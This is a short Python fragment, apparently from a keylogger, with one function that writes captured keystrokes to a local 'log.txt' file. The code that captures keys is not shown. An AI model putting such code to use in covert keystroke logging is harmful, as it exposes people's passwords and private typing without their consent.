# function to write the keystrokes to the log file
def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # removing '' of the strings
            k = str(key).replace("'", "")
            f.write(k)
            # space between every keystroke for readability
            f.write(' ')